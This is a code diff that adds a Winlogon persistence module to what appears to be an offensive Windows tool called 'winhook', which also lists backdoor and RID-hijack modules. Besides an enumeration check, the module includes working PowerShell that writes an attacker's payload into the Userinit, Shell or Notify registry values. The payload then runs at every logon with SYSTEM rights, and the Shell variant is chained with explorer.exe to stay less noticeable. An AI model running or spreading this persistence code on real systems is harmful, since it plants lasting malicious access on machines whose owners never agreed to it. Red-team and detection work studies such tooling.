@@ -24272,6 +24272,186 @@ Write-Output "[+] RID restored: ${targetUser} -> RID ${targetRid}"
   return { output: output.join("\n"), findings }
 }
 
+async function winlogonPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const key = argVal(args, "--key") || "userinit"
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Winlogon Helper DLL Persistence...\n"]
+
+  const winlogonPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Winlogon Registry Keys ==="
+Write-Output ""
+
+$wl = Get-ItemProperty '${winlogonPath}' -ErrorAction SilentlyContinue
+
+Write-Output "[*] Shell: $($wl.Shell)"
+Write-Output "    Default: explorer.exe"
+Write-Output "    Purpose: Runs as user shell after logon"
+if ($wl.Shell -and $wl.Shell -ne 'explorer.exe') {
+  Write-Output "    [!] NON-DEFAULT — possible persistence"
+}
+Write-Output ""
+
+Write-Output "[*] Userinit: $($wl.Userinit)"
+Write-Output "    Default: C:\\Windows\\system32\\userinit.exe,"
+Write-Output "    Purpose: Runs initialization scripts at logon (comma-separated list)"
+$defaultUserinit = 'C:\\Windows\\system32\\userinit.exe,'
+if ($wl.Userinit -and $wl.Userinit.Trim() -ne $defaultUserinit -and $wl.Userinit.Trim() -ne $defaultUserinit.TrimEnd(',')) {
+  Write-Output "    [!] NON-DEFAULT — possible persistence"
+}
+Write-Output ""
+
+Write-Output "[*] Notify: (checking legacy DLL notification packages)"
+$notifyPath = '${winlogonPath}\\Notify'
+if (Test-Path $notifyPath) {
+  $notifyKeys = Get-ChildItem $notifyPath -ErrorAction SilentlyContinue
+  foreach ($nk in $notifyKeys) {
+    $dll = (Get-ItemProperty $nk.PSPath -Name DLLName -ErrorAction SilentlyContinue).DLLName
+    Write-Output "    $($nk.PSChildName): $dll"
+  }
+  if ($notifyKeys.Count -eq 0) { Write-Output "    (none)" }
+} else {
+  Write-Output "    Notify subkey does not exist (normal on modern Windows)"
+}
+Write-Output ""
+
+# Check Wow64 (32-bit) path too
+$wl32 = Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -ErrorAction SilentlyContinue
+if ($wl32) {
+  Write-Output "=== Wow64 Winlogon ==="
+  Write-Output "[*] Shell (32-bit): $($wl32.Shell)"
+  Write-Output "[*] Userinit (32-bit): $($wl32.Userinit)"
+}
+
+Write-Output ""
+Write-Output "[*] Winlogon keys execute in SYSTEM context at every user logon"
+Write-Output "[*] Shell = user's desktop shell, Userinit = pre-shell initialization"
+Write-Output "[*] Notify = legacy DLL callbacks (deprecated but still functional)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("NON-DEFAULT")) {
+      findings.push({
+        checkId: "WIN-WLGN-001",
+        provider: "windows",
+        severity: "high",
+        status: "SUSPICIOUS",
+        resource: "registry://winlogon",
+        title: "Non-default Winlogon registry values detected — possible persistence",
+        details: "Shell or Userinit values differ from defaults, which may indicate persistence mechanism.",
+        remediation: "Verify the non-default values are legitimate. Restore defaults if malicious.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!payload) {
+      output.push("ERROR: --payload required")
+      output.push("")
+      output.push("Keys:")
+      output.push("  --key userinit  — Append to Userinit (runs BEFORE shell, comma-separated)")
+      output.push("  --key shell     — Replace Shell (runs AS the shell, risky — breaks desktop)")
+      output.push("  --key notify    — Register Notify DLL (legacy, pre-Vista style)")
+      output.push("")
+      output.push("Recommended: --key userinit (least disruptive, payload runs alongside normal init)")
+      return { output: output.join("\n"), findings }
+    }
+
+    if (key === "userinit") {
+      const script = `
+$current = (Get-ItemProperty '${winlogonPath}' -Name Userinit).Userinit
+Write-Output "[*] Current Userinit: $current"
+
+# Append payload (Userinit is comma-separated)
+$new = "$current${payload},"
+Set-ItemProperty '${winlogonPath}' -Name Userinit -Value $new -Type String
+Write-Output "[+] New Userinit: $new"
+Write-Output ""
+Write-Output "[*] Payload will run at every user logon in SYSTEM context"
+Write-Output "[*] Original programs still run (non-destructive append)"
+Write-Output ""
+Write-Output "Restore: winhook winlogon_persist --action restore --key userinit"
+Write-Output "ORIGINAL=$current"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (key === "shell") {
+      const script = `
+$current = (Get-ItemProperty '${winlogonPath}' -Name Shell).Shell
+Write-Output "[*] Current Shell: $current"
+Write-Output "[!] WARNING: Replacing Shell will prevent explorer.exe from launching"
+Write-Output "[!] The user will see your payload instead of their desktop"
+Write-Output ""
+
+# Set payload as shell (chain with explorer to be less obvious)
+$new = "${payload},explorer.exe"
+Set-ItemProperty '${winlogonPath}' -Name Shell -Value $new -Type String
+Write-Output "[+] New Shell: $new"
+Write-Output "[*] Payload runs first, then explorer.exe loads normally"
+Write-Output ""
+Write-Output "Restore: winhook winlogon_persist --action restore --key shell"
+Write-Output "ORIGINAL=$current"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (key === "notify") {
+      const script = `
+$notifyPath = '${winlogonPath}\\Notify\\CyberStrike'
+New-Item -Path $notifyPath -Force | Out-Null
+Set-ItemProperty $notifyPath -Name DLLName -Value '${payload}' -Type String
+Set-ItemProperty $notifyPath -Name Logon -Value 'Handler' -Type String
+Set-ItemProperty $notifyPath -Name Impersonate -Value 0 -Type DWord
+Set-ItemProperty $notifyPath -Name Asynchronous -Value 1 -Type DWord
+
+Write-Output "[+] Winlogon Notify DLL registered: ${payload}"
+Write-Output "[*] DLL loaded at logon, Handler export called"
+Write-Output "[!] Note: Notify packages are deprecated post-Vista but registry key still processed on some systems"
+Write-Output ""
+Write-Output "Remove: winhook winlogon_persist --action restore --key notify"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (output.some(o => o.includes("STATUS=SUCCESS"))) {
+      findings.push({
+        checkId: "WIN-WLGN-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `winlogon://${key}`,
+        title: `Winlogon ${key} persistence installed: ${payload}`,
+        details: `Payload registered via Winlogon ${key} key. Executes at every user logon in SYSTEM context.`,
+        remediation: `Restore: winhook winlogon_persist --action restore --key ${key}`,
+      })
+    }
+  }
+
+  if (action === "restore") {
+    const script = key === "userinit"
+      ? `Set-ItemProperty '${winlogonPath}' -Name Userinit -Value 'C:\\Windows\\system32\\userinit.exe,' -Type String; Write-Output "[+] Userinit restored to default"`
+      : key === "shell"
+        ? `Set-ItemProperty '${winlogonPath}' -Name Shell -Value 'explorer.exe' -Type String; Write-Output "[+] Shell restored to default"`
+        : `Remove-Item '${winlogonPath}\\Notify\\CyberStrike' -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "[+] Notify key removed"`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -27916,6 +28096,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   accessibility_backdoor: accessibilityBackdoor,
   ifeo_persist: ifeoPersist,
   rid_hijack: ridHijack,
+  winlogon_persist: winlogonPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
